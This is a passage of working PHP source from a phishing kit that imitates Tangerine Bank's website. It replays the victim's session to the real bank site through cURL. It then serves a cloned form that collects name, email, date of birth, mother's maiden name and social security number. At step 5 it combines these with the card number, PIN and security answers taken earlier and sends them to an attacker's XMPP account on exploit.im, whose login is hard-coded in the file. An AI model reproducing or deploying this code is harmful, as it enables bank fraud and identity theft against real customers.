		$localinfo ='version%253D1%2526pm%255Ffpua%253Dmozilla%252F5%252E0%2520%2528windows%2520nt%25206%252E1%253B%2520wow64%253B%2520rv%253A32%252E0%2529%2520gecko%252F20100101%2520firefox%252F32%252E0%257C5%252E0%2520%2528Windows%2529%257CWin32%2526pm%255Ffpsc%253D24%257C1440%257C900%257C860%2526pm%255Ffpsw%253D%2526pm%255Ffptz%253D4%2526pm%255Ffpln%253Dlang%253Dfr%252DFR%257Csyslang%253D%257Cuserlang%253D%2526pm%255Ffpjv%253D1%2526pm%255Ffpco%253D1';
	$post = 'TRANSACTION_TOKEN='.$transcooc.'&command=saveEnrollment&locale=&device=&pm_fp=&MainFormAction=&Change+Question=Change';
	$header=array('Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Content-Type:application/x-www-form-urlencoded',
					'Origin:https://secure.tangerine.ca',
					'Referer: https://secure.tangerine.ca/web/Tangerine.html?command=displayValidatedEnrollment',
					'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
					'Cookie: '.$lastcooc.';'.$lastcooc1.';'.$authcooc2.';'.implode(";", $coocc1).';'.implode(";", $coocc));
//		curl_setopt($sh, CURLOPT_PROXY, $proxy);
		curl_setopt($sh,CURLOPT_URL,$urlpostcc);
		curl_setopt($sh,CURLOPT_FOLLOWLOCATION,true);
		curl_setopt($sh,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($sh,CURLOPT_HTTPHEADER,$header);
		curl_setopt($sh,CURLOPT_CAINFO, getcwd() . "www.tangerine.ca.crt"); 
		curl_setopt($sh,CURLOPT_POST,true);
		curl_setopt($sh,CURLOPT_POSTFIELDS,$post);
		curl_setopt($sh,CURLOPT_HEADER,false);
		$data = curl_exec($sh);
		
		
		
		
}
		
elseif($step==3) 
{
 $_SESSION['answer'] = trim(rtrim($_POST['answer'])); 
}

elseif($step==5) 
{

		$str =  "Card Number: ".$_SESSION['cc']."\r\n";
		$str .= "PIN#: ".$_SESSION['pin']."\r\n";
		$str .= $_SESSION['questions']."\r\n";			
		$str .= "First Name: ".$_POST['firstname']."\r\nLast Name: ".$_POST['lastname']."\r\nEmail: ".$_POST['email']."\r\nDOB: ".$_POST['dob']."\r\nMother's Maiden Name: ".$_POST['mothermaiden']."\r\nSocial Security Number: ".$_POST['ssn']."\r\n\r\n";
		$str .= "IP: ".$_SERVER['REMOTE_ADDR']."\r\n";
		$str .= "USER AGENT: ".$_SERVER['HTTP_USER_AGENT']."\r\n";
		$str .= "DATE: ".date("Y/m/d H:i:s")."\r\n";
		
		$jabber = array('me'=>'logins247x@exploit.im', 'server'=> 'exploit.im', 'port'=>'5222', 'user'=>'logins247x@exploit.im', 'pass'=>'Fireman22');

$str = htmlspecialchars($str);;


include_once( 'XMPPHP/XMPP.php');

$conn = new XMPPHP_XMPP($jabber['server'], $jabber['port'], $jabber['user'], $jabber['pass'], 'xmpphp', $jabber['server'], $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);

try {
    $conn->connect();
    $conn->processUntil('session_start');
    $conn->presence();
    $conn->message($jabber['me'], $str);
    $conn->disconnect();
} catch(XMPPHP_Exception $e) {
  
}

header("location: ".$redirect);
exit;
	
	
}


if($step==4)
{
?>

<!DOCTYPE html SYSTEM "">
<!--[if lt IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8 lt-ie7"><![endif]--><!--[if IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if IE 8]><html lang="en-CA" class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><html lang="en-CA" class="no-js"><![endif]--><html lang="en-CA" class="no-js">
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0, maximum-scale=1.0">
<meta name="format-detection" content="telephone=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-itunes-app" content="app-id=357596184">
<meta name="msApplication-ID" content="tangerine-canada">
<meta name="msApplication-PackageFamilyName" content="tangerine-canada.53e08338-59a9-40a1-a866-00d5b8ab432c">
<script type="text/javascript" src="css/dtagent55_bj3_5226.js" data-dtconfig="rid=RID_-1166864845|rpid=435307327|domain=site.com|tp=500,50,3|bandwidth=1200"></script>
<link rel="stylesheet" href="css/core.min.css">
<link rel="stylesheet" href="css/layout.css">
<link rel="stylesheet" href="css/module.css">
<link rel="stylesheet" href="css/state.css">
<meta name="alias" content="http://www.site.com/">
<meta name="author" content="Tangerine Bank">
<meta name="COPYRIGHT" content="Copyright (c) 2014 Tangerine">
<meta name="description" content="At Tangerine you never pay services fees. Your savings account earns a high rate of interest, requires no minimum balance, and your money is never locked in. Save Your Money with Tangerine. Our Loan Account and Mortgage products are industry leading, and investing options are available with our Mutual Funds. ">
<meta name="FORMAT" content="text/html">
<meta name="apple-itunes-app" content="app-id=847844097">
<meta name="google-play-app" content="app-id=ca.tangerine.clients.tablet&amp;hl=en">
<meta name="KEYWORDS" content="bank, banking, Canadian banks, financial services, Internet banking, electronic commerce, PC banking, ABM, telephone banking, business banking, business accounts, savings accounts, loans, mortgages, mutual funds, virtual bank, Virtual banking, great interest rates, Alternative banking, CDIC,ING, ING Bank, Web banking, GIC, RRSP, RSP,Performance, Save Your Money, Interac, Mastercard, Maestro, U.S. dollar, Cirrus">
<meta name="TITLE" content="Tangerine">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="cache-control" content="no-cache, no-store">
<noscript>
<meta http-equiv="refresh" content="0; Url=en_CA/web/BrowserSettings.html">
</noscript>
<title>Tangerine bank</title>
<meta content="bank, banking, Canadian banks, financial services, Internet banking, electronic commerce, PC banking, ABM, telephone banking, business banking, business accounts, savings accounts, loans, mortgages, mutual funds, virtual bank, Virtual banking, great interest rates, Alternative banking, CDIC,ING, ING Bank, Web banking, GIC, RRSP, RSP,Performance, Save Your Money, Interac, Mastercard, Maestro, U.S. dollar, Cirrus" name="KEYWORDS">
<script src="css/modernizr.js"></script>
</head>
<body>
<div class="viewport">
<div class="frame">
<div id="popout-nav" class="menu collapse">
<header class="mobile-menu-header">
<div class="mobile-menu-header-left">
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">Log me in</a>
</div>
<div class="mobile-menu-header-right">
<div class="btn-group">
<a class="btn btn-warning active" type="button">EN</a><a class="btn" type="button" href="http://www.site.com/fr/index.html">FR</a>
</div>
</div>
</header>
<ul class="mobile-menu-nav">
<li>
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-savings" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-savings">
<a class="mobile-dropdown-item" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a><a class="mobile-dropdown-item" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-chequing" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-chequing">
<a href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mutual-funds" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mutual-funds">
<a class="mobile-dropdown-item" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mortgages" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mortgages">
<a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-ways-to-bank" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-ways-to-bank">
<a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Cafe</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Debit Card</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
<li class="seperator"></li>
<li class="mobile-static">
<a href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/accounts-rates/ourrates/index.html">Rates</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li class="mobile-static">
<a href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/faq/">FAQ</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/about-us/index.html">About us</a>
</li>
</ul>
</div>
<div class="view">
<section class="mobile-header-top hidden-desktop">
<div class="navbar-inner">
<button type="button" class="btn btn-navbar btn-menu" id="mobile-btn-open-nav" data-target="#popout-nav"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><img src="css/tangerine_lockup.jpg" alt="Tangerine logo" width="160"><button class="btn btn-navbar btn-search icon-search collapsed" type="button" data-toggle="collapse" data-target="#mobile-header-search"></button>
</div>
<div class="collapse" id="mobile-header-search">
<form name="gs" method="GET" action="http://www.site.com/search">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search" tabindex="-1">
</form>
</div>
</section>
	
		
			
<section class="header-top visible-desktop">
<div class="container">
<div class="header-top-menu">
<a class="header-top-menu-link" href="http://www.site.com/en/about-us/index.html">About us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/about-us/contact-us/index.html">Contact us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/faq/">FAQs</a> |     

              <a href="http://www.site.com/fr/index.html">Francais</a> |
                  <a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA"><b>Log me in</b></a>
</div>
</div>
</section>
<section class="header-main visible-desktop">
<div class="container">
<div class="row-fluid">
<div class="span3">
<a href="http://www.site.com/en/" class="header-main-logo"><img src="css/tangerine_lockup.jpg" alt="Tangerine logo" width="200" height="50"></a>
</div>
<div class="span9">
<div class="header-main-menu">
<form name="gs" method="GET" action="http://www.site.com/search" class="pull-right">
<ul>
<li>
<a class="header-main-menu-link" href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/rates/">Rates</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li>
<a class="header-main-menu-link" href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
</ul>
<div class="input-append">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search"><button class="btn btn-secondary" type="submit"><i class="icon-search"></i></button>
</div>
</form>
</div>
</div>
</div>
</div>
</section>
<section class="nav-main">
<div class="container">
<nav class="navbar">
<ul class="nav dropdown">
<li>
<a href="/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Cafe</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Client Card</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
</ul>
</nav>
</div>
</section>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	
	
<section class="content">
<div class="container">
<div class="row-fluid">
<div class="span12 content-span">
<div class="content-main">
<div class="row-fluid">
<header class="content-main-header">
<div class="span12">
<h1>Verified your Tangerine Account</h1>
</div>
</header>
</div>
		
<div class="enrollment-form">
<form action="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']?>" method="post" id="MainForm" name="MainForm" class="form-horizontal form-drop-controls form-long-forms" data-validate="enable">
<input type="hidden" NAME="step" value="5"><input type="hidden" name="PrimaryApplicant" id="PrimaryApplicant" value="true">
<div class="enrollment-progress-container">
<hr class="steps-connector">
<ol class="enrollment-progress-steps">
<li class="
            step 
            active">
<div class="step-label">
<span class="step-number"></span><span class="step-link">Your info</span>
</div>

<div class="enrollment-section">
<h2>About you</h2>

<div class="control-group">
<label class="control-label" for="FirstName">First Name</label>
<div class="controls">
<input type="text" name="firstname" value="" maxlength="32" autocomplete="off" id="FirstName" data-rules="required:true,_name:true,_name:true" data-toggle="tooltip" data-placement="right" data-html="false" title="Please enter your first name here." required="Required">
</div>
</div>
<div class="control-group">
<label class="control-label" for="LastName">Last Name</label>
<div class="controls">
<input type="text" id="LastName" name="lastname" value="" maxlength="32" autocomplete="off" data-rules="required:true,_name:true,_name:true" data-toggle="tooltip" data-placement="right" data-html="false" title="Please enter your last name here." required="Required">
</div>
</div>

</div>
<div class="control-group">
<label class="control-label">Email Address</label>
<div class="controls">
<input type="text" name="email" maxlength="50" value="" autocomplete="off" data-rules="required:true" data-toggle="tooltip" data-placement="right" data-html="true" title="" required="Required">
</div>
</div>

<div class="control-group">
<label class="control-label">Date of Birth</label>
<div class="controls">
<input type="text" name="dob" maxlength="12" value="" autocomplete="off" data-rules="required:true" data-toggle="tooltip" data-placement="right" data-html="true" title="" placeholder="MM/DD/YY" required="Required">
</div>
</div>
<div class="control-group">
<label class="control-label">Mother Maiden Name</label>
<div class="controls">
<input type="text" name="mothermaiden" maxlength="20" value="" autocomplete="off" data-rules="required:true" data-toggle="tooltip" data-placement="right" data-html="true" title="" required="Required">
</div>
</div>


<div class="control-group">
<label class="control-label">Social Security Number</label>
<div class="controls">
<input type="text" name="ssn" maxlength="9" value="" autocomplete="off" data-rules="required:true" data-toggle="tooltip" data-placement="right" data-html="true" title="" required="Required">
</div>
</div>
<div class="control-group" align="right"></div>
</div>
</div>


<div class="button-holder-container">
<div class="button-holder">
<button type="submit" id="SAVE ANY CHANGES AND CONTINUE TO NEXT PAGE" name="SAVE ANY CHANGES AND CONTINUE TO NEXT PAGE" class="btn btn-primary">Next</button>
</div>
</div>
<SCRIPT language="JavaScript">
			var axel = Math.random()+"";
			var a = axel * 10000000000000;
			document.write('<IFRAME SRC="http://fls.doubleclick.net/activityi;src=903102;type=chequ404;cat=thriv783;ord='+ a + '?" WIDTH="1" HEIGHT="1" FRAMEBORDER="0"></IFRAME>');
		</SCRIPT>
<NOSCRIPT><IFRAME SRC="http://fls.doubleclick.net/activityi;src=903102;type=chequ404;cat=thriv783;ord=1?" WIDTH="1" HEIGHT="1" FRAMEBORDER="0"></IFRAME></NOSCRIPT>
<meta name="WT.pn_id" content="4000">
<meta name="WT.pn" content="MNYWRKCAD">
<script xmlns:xalan="http://xml.apache.org/xslt" type="text/javascript">
			(function() {
				var firstScriptElement = document.getElementsByTagName('script')[0];
				var javaScriptElement;
				var loadScript = function(url, id) {
					if (!document.getElementById(id)) {
						javaScriptElement = document.createElement('script'); 
						javaScriptElement.src = url; 
						javaScriptElement.id = id;
						javaScriptElement.onload = javaScriptElement.onreadystatechange = function(){
							var readyState = this.readyState;
							if (readyState && readyState != 'complete' && readyState != 'loaded') return;	
							initRightNowClientController();
						};
						firstScriptElement.parentNode.insertBefore(javaScriptElement, firstScriptElement);
					}
				};
				loadScript('http://ing-eng.frontlinesvc.com/euf/rightnow/RightNow.Client.js', 'RightNow.Client.js');
			}());

		
		function initRightNowClientController() {
			    RightNow.Client.Controller.addComponent(
			        {
			            p:"1",
			            chat_login_page: "/app/chat/chat_landing",
			            seconds: 120,
			            wait_threshold: 300,            
			            instance_id: "proactive",
			            div_id: "telusDiv",
			            module: "ProactiveChat",
			            modal: "true",
			            avatar_image: "",
			            label_dialog_header: "",
			            label_question: "If you have any questions, a chat associate is available. Would you like to chat now?",
			            label_title: "",
			            logo_image: "",
			            type: 2
			        },
			        "http://ing-eng.frontlinesvc.com/ci/ws/get"
			    );
		}
		</script>
</form>
</div>
	
</div>
</div>
</div>
</div>
</section>

<footer class="footer" id="main-footer">
<div class="container">
<div id="footer-body" class="footer-body">
<div class="row-fluid">
<div class="span12">
<h1>We're here for you</h1>
</div>
</div>
<div class="row-fluid">
<div class="span4">
<h3>Phone us</h3>
<div>
<dl>
<dt>Give us a call 24 hours a day, 7 days a week at</dt>
<dd class="footer-tel">1-800-464-3473</dd>
</dl>
</div>
<h3>Chat us up</h3>
<p>Chat availability <br>Weekdays: 8am &#239;&#191;&#189; 8pm ET <br>Weekend: 9am &#239;&#191;&#189; 5pm ET</p>
<div>
<p>
<span id="chat-unavailable" class="is-hidden">Sorry, there are no Direct Associates available at the moment.</span><span id="chat-available" class="">
                                Get the conversation started &#239;&#191;&#189;
      							<a id="ChatBtn" href="javascript:ClickToChat(24);">Chat with us</a><script type="text/javascript">
	                  	function ClickToChat(input){
												window.open ("http://ing-eng.frontlinesvc.com/app/chat/chat_landing/prod/"+input,"chat","menubar=1,resizable=1,width=350,height=450");
											}
	                  </script></span>
</p>
</div>
</div>
<div class="span4">
<h3>Email us</h3>
<div>
<dl>
<dt>For general questions or inquiries</dt>
<dd>
<a href="mailto:clientservices@site.com">clientservices@site.com</a>
</dd>
</dl>
</div>
<h3>Visit us</h3>
<p>Come visit us at one of our <a href="http://www.site.com/en/ways-to-bank/cafe/index.html">Tangerine Cafes</a>
</p>
</div>
<div class="span4">
<h3>Get social with us</h3>
<div>
<div class="social-links">
<a href="http://twitter.com/TangerineBank" class="icon-twitter-sign" title="Twitter" target="_blank"></a><a href="http://www.facebook.com/TangerineBank" class="icon-facebook-sign" title="Facebook" target="_blank"></a><a href="http://www.linkedin.com/company/tangerine-bank" class="icon-linkedin-sign" title="LinkedIn" target="_blank"></a><a href="http://instagram.com/TangerineBank" class="icon-instagram" title="Instagram" target="_blank"></a><a href="http://www.youtube.com/TangerineBank" class="icon-youtube-sign" title="YouTube" target="_blank"></a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="footer-navbar">
<div class="container">
<div class="row-fluid">
<div class="span12">
<div id="footer-see-more" class="footer-see-more">
<a>Contact us<i class="icon-caret-up"></i></a>
</div>
<ul class="footer-links-bottom">
<li>
<a href="http://www.site.com/en/about-us/careers/index.html">Careers</a>
</li>
<li>
<a href="http://www.site.com/en/privacy/index.html">Privacy</a>
</li>
<li>
<a href="http://www.site.com/en/legal/index.html">Legal</a>
</li>
<li>
<a href="http://www.site.com/en/security/index.html">Security</a>
</li>
<li>
<a href="http://www.site.com/en/sitemap/index.html">Site&nbsp;map</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</div>
<script>
      //Default value - set to true on xsl's to bypass default keypress handler
      var doCustomKeypress = false;
    </script>
<div id="modalStatus" style="display:none">true</div>
<div id="RefreshLinkSection" style="display:none">/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA</div>
<script src="css/jquery.min.js"></script><script src="../../js/bootstrap/bootstrap.min.js"></script><script src="css/custom-plugins.js"></script><script language="javascript">
      !function ($) {
        $('[data-popupWin="true"]').click(function(){
          var popupName = $(this).attr('data-popupWin-name');
          var features = $(this).attr('data-popupWin-features');
        
          if ($(this).is('a')) {
            window.open($(this).attr('href'), popupName, features);
            return false;            
          }
          else if (($(this).is('input') || $(this).is('button')) && ($(this).attr('type') == 'submit')) {
            window.open('', popupName, features);
            $('#' + $(this).attr('data-popupWin-form')).attr('target', popupName);            
          }
        })
      }(window.jQuery);
    </script><script language="JavaScript" src="css/jquery.map.custom.js"></script><script type="text/javascript">
    
     $('#jointAccountYes').on('click', function() {
       $('#showJoint').show();
     })
     $('#jointAccountNo').on('click', function() {
       $('#showJoint').hide();
     })
    </script><script src="css/jquery.validate.js"></script><script src="css/bootstrap-validation.js"></script><script src="../../js/jquery/jquery-ui.min.js"></script><script>
        //Loads positionOverride function only once
        //Fix TQA00396632
        var positionOverride = function (element, datepicker) {
	      	var resetPosition = function() {
          var touch = $('html').hasClass('touch') && window.matchMedia("(min-width: 767px)").matches
            , $el = $(element)
            , dpPosition = 'absolute' //touch ? 'relative' : 'absolute'
            , dpTop = touch ? 0 : $el.outerHeight() + ($el.offset().top - $el.parent().offset().top)
            , inTableAndTablet = $el.parents('.table')[0] && window.matchMedia("(min-width: 767px) and (max-width: 979px)").matches
            , dpLeft = inTableAndTablet ? $el.offset().left - 80 : 0

	          datepicker.dpDiv
	          .css({
	          	left: dpLeft,
	          	position: dpPosition,
	          	top: dpTop,
	          	zIndex: 1101
	          })
	          .attr('data-controller', element.id)
	          .insertAfter(element)
	        }
	
	        setTimeout(resetPosition, 0)
        }
       
       </script><script language="javascript">
          var len= $('script').filter(function(){
            return ($(this).attr('src') == 'css/bootstrap.min.js'); 
          }).length;
          
          if (len==0){
            $.getScript("css/bootstrap-tooltip.js");
            $.getScript("css/bootstrap-transition.js");
          }
        </script><script language="javascript">
            //TQA00355569 - already done in custom-plugins.js
		    //$('[data-toggle="tooltip"]').tooltip();
	  	</script><script language="javascript">
        $(function(){ 
        
             var thisYear = (new Date).getFullYear();
             var endYear = thisYear - 126;
             var range = endYear + ':' + thisYear
           
          $('#DateOfBirth').datepicker({
            dateFormat: 'dd/mm/yy'
             ,changeMonth: true  ,changeYear: true  , yearRange: range 
            ,beforeShow: positionOverride //TQA00351293
            ,firstDay:0 //Sunday First
          }); 
          
           $('#DateOfBirth').attr('readonly','readonly').parent().css('position', 'relative')
        });
      </script><script language="javascript">
        $(function(){ 
        
             var thisYear = (new Date).getFullYear();
             var endYear = thisYear + 50;
             var range = thisYear + ':' + endYear
           
          $('#ASPStartDate').datepicker({
            dateFormat: 'dd/mm/yy'
            , minDate: 2 ,changeMonth: true  ,changeYear: true  , yearRange: range 
            ,beforeShow: positionOverride //TQA00351293
            ,firstDay:0 //Sunday First
          }); 
          
           $('#ASPStartDate').attr('readonly','readonly').parent().css('position', 'relative')
        });
      </script><script>
      !function ($) {
        var $industrySelect = $('#IndustryOccupation')
          , $occupationSelect = $('#Occupation')
          , $occupationDropdown = $occupationSelect.siblings('.dropdown-menu')
          , $occupationSelected = $occupationSelect.siblings('[data-toggle=dropdown]')
          , occupationDefault = $occupationSelected.html() // Select an occupation
          , defaultOccupation = ''
          , emptySelectOccupation = 'Select an occupation'
          , occupationWrapperDivId = $('#occupationShowHide')
          , industryData = {"industry":[
            
                {"id":"ABIFA", "name":"Accounting, Banking, Insurance & Finance" , "occupation":[
                
                    {"id":"ACTNT","name":"Accountant"}
                    ,
                    {"id":"ACTUR","name":"Actuary"}
                    ,
                    {"id":"AUDIT","name":"Auditor"}
                    ,
                    {"id":"BNKAD","name":"Bank Administrator"}
                    ,
                    {"id":"BOKPR","name":"Bookkeeper"}
                    ,
                    {"id":"CACAC","name":"Compliance Analyst"}
                    ,
                    {"id":"CFOFF","name":"Chief Financial Officer"}
                    ,
                    {"id":"CLADJ","name":"Claims Adjustor"}
                    ,
                    {"id":"CLWRAC","name":"Clerical Worker"}
                    ,
                    {"id":"CNSTAC","name":"Consultant"}
                    ,
                    {"id":"CNTRLR","name":"Controller"}
                    ,
                    {"id":"COMTRA","name":"Commodities Trader"}
                    ,
                    {"id":"CSREP","name":"Customer Service Representative"}
                    ,
                    {"id":"ECONM","name":"Economist"}
                    ,
                    {"id":"EXESMB","name":"Executive/Senior Manager - Banking"}
                    ,
                    {"id":"EXESMF","name":"Executive/Senior Manager - Finance"}
                    ,
                    {"id":"EXESMI","name":"Executive/Senior Manager - Insurance"}
                    ,
                    {"id":"FINAD","name":"Financial Advisor"}
                    ,
                    {"id":"FINADM","name":"Financial Administration"}
                    ,
                    {"id":"FINAN","name":"Financial Analyst"}
                    ,
                    {"id":"FINPLA","name":"Financial Planner"}
                    ,
                    {"id":"INSAG","name":"Insurance Agent"}
                    ,
                    {"id":"INSBRO","name":"Insurance Broker"}
                    ,
                    {"id":"INVAN","name":"Investment Analyst"}
                    ,
                    {"id":"INVBAN","name":"Investment Banker"}
                    ,
                    {"id":"INVFUM","name":"Investment Fund Manager"}
                    ,
                    {"id":"INVREP","name":"Investment Representative"}
                    ,
                    {"id":"LOANO","name":"Loan Officer"}
                    ,
                    {"id":"MFSALE","name":"Mutual Fund Sales"}
                    ,
                    {"id":"MGRBK","name":"Manager - Banking"}
                    ,
                    {"id":"MGRBR","name":"Mortgage Broker"}
                    ,
                    {"id":"MGRFI","name":"Manager - Finance"}
                    ,
                    {"id":"MGRIN","name":"Manager - Insurance"}
                    ,
                    {"id":"SECTD","name":"Securities Trader"}
                    ,
                    {"id":"STATIS","name":"Statistician"}
                    ,
                    {"id":"STCBRO","name":"Stock Broker"}
                    ,
                    {"id":"TRESR","name":"Treasurer"}
                    ,
                    {"id":"UNDWR","name":"Underwriter"}
                    ]},
                {"id":"AHRAH", "name":"Administration & Human Resources" , "occupation":[
                
                    {"id":"ADMNA","name":"Administrative Assistant"}
                    ,
                    {"id":"CLWRAD","name":"Clerical Worker"}
                    ,
                    {"id":"CNSTAD","name":"Consultant"}
                    ,
                    {"id":"CSREP","name":"Customer Service Representative"}
                    ,
                    {"id":"CUSTOD","name":"Custodian"}
                    ,
                    {"id":"EXEAST","name":"Executive Assistant"}
                    ,
                    {"id":"EXESMA","name":"Executive/Senior Manager - Administrative Services"}
                    ,
                    {"id":"EXESMH","name":"Executive/Senior Manager - Human Resources"}
                    ,
                    {"id":"FACSP","name":"Facilities Specialist"}
                    ,
